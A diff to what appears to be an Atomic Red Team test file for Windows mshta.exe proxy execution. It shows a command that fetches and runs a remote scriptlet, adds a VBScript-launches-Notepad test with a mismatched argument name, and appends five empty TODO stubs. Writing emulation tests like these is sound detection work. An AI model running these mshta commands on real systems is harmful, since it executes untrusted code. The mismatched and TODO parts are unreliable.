@@ -18,3 +18,132 @@ atomic_tests:
     command: |
       mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
       
+
+- name: Mshta calls a local vbs file to launch Notepad.exe
+  description: Tests execution of a local program by a VBScript file called by Mshta
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    local_file: 
+      description: create a local vbs file
+      type: strings
+      default: Set objShell = WScript.CreateObject("WScript.Shell") objShell.Run ("%windir%\notepad.exe ")
+    
+
+  executor:
+    name: command_prompt
+    command: |
+      mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""{local_file_path}"")(window.close)")
+
+
+- name: TODO
+  description: |
+    TODO
+
+  supported_platforms:
+    - windows
+    - macos
+    - centos
+    - ubuntu
+    - linux
+
+  input_arguments:
+    output_file:
+      description: TODO
+      type: todo
+      default: TODO
+
+  executor:
+    name: command_prompt
+    command: |
+      TODO
+
+- name: TODO
+  description: |
+    TODO
+
+  supported_platforms:
+    - windows
+    - macos
+    - centos
+    - ubuntu
+    - linux
+
+  input_arguments:
+    output_file:
+      description: TODO
+      type: todo
+      default: TODO
+
+  executor:
+    name: command_prompt
+    command: |
+      TODO
+
+- name: TODO
+  description: |
+    TODO
+
+  supported_platforms:
+    - windows
+    - macos
+    - centos
+    - ubuntu
+    - linux
+
+  input_arguments:
+    output_file:
+      description: TODO
+      type: todo
+      default: TODO
+
+  executor:
+    name: command_prompt
+    command: |
+      TODO
+
+- name: TODO
+  description: |
+    TODO
+
+  supported_platforms:
+    - windows
+    - macos
+    - centos
+    - ubuntu
+    - linux
+
+  input_arguments:
+    output_file:
+      description: TODO
+      type: todo
+      default: TODO
+
+  executor:
+    name: command_prompt
+    command: |
+      TODO
+
+- name: TODO
+  description: |
+    TODO
+
+  supported_platforms:
+    - windows
+    - macos
+    - centos
+    - ubuntu
+    - linux
+
+  input_arguments:
+    output_file:
+      description: TODO
+      type: todo
+      default: TODO
+
+  executor:
+    name: command_prompt
+    command: |
+      TODO
